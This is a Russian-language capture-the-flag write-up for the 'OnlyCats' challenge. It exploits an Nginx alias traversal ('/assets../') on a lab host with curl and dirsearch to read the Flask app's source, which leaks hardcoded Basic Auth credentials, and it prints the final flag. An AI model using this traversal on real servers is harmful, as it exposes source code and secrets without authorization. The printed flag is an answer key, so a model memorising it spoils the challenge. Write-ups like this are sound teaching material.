# OnlyCats

## Описание:


| Название | Сложность | Автор |
|------|------------|--------|
| OnlyCats | Easy |[@collapsz](https://github.com/collapsz17) |

## TLDR

Утечка данных авторизации через **Nginx alias traversal**

---
## Решение:

На веб интерфейсе не самое богатое на функционал приложение:

![изображение](https://github.com/user-attachments/assets/e38d2519-1891-4850-98a6-463573a630b9)

`dirsearch` покажет имеющиеся директории:

![изображение](https://github.com/user-attachments/assets/fb52b39f-9aef-4214-9ea7-bc4b10c91568)

`whatweb` – стек используемых технологий: 

![изображение](https://github.com/user-attachments/assets/19c0a3ce-6423-46f5-816a-5f0310a6d6cb)

Примечательно, что приложение развернуто на `nginx`. Немного погуглив, можно выйти на данный [материал](https://habr.com/ru/articles/745718/)

И в самом деле запрос вида 
```
curl http://192.168.0.102:81/assets/cat.jpg | head -n 10
```

Выведет нам то же самое, что и

```
curl http://192.168.0.102:81/assetscat.jpg | head -n 10
```

![изображение](https://github.com/user-attachments/assets/bc89b5e0-d4ab-451e-ad67-b6e05d08239b)

Таким образом находим на сервере мискофигурацию в nginx alias. Посмотрим что там еще найдется:

```
dirsearch http://192.168.0.102:81/assets../
```
![изображение](https://github.com/user-attachments/assets/922e47f0-460b-4bdc-bc52-0d0b9b685621)

app.py содержит в себе весь исходный код приложения, включая креды для Basic Auth:
```
curl 192.168.0.102:81/assets../app.py                                                                                                                               ─╯
from flask import Flask, request, jsonify, render_template
from flask_basicauth import BasicAuth

from os import getenv

app = Flask(__name__)

app.config['BASIC_AUTH_USERNAME'] = 'cat' 
app.config['BASIC_AUTH_PASSWORD'] = 'icr34t3d0nlyc4tsjustt0sh4res0m3c4tp1ctur3s'  
basic_auth = BasicAuth(app)


@app.route('/')
def hello():
    return render_template('index.html')


@app.route('/admin', methods=['GET', 'POST'])
@basic_auth.required
def admin():
    flag = getenv('FLAG')  
    return render_template('admin.html', flag = flag)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

Авторизуемся на /admin c этими кредами, забираем флаг
## Flag:
rdg{af4cf13151aee7af4aa26b9bb817a079}
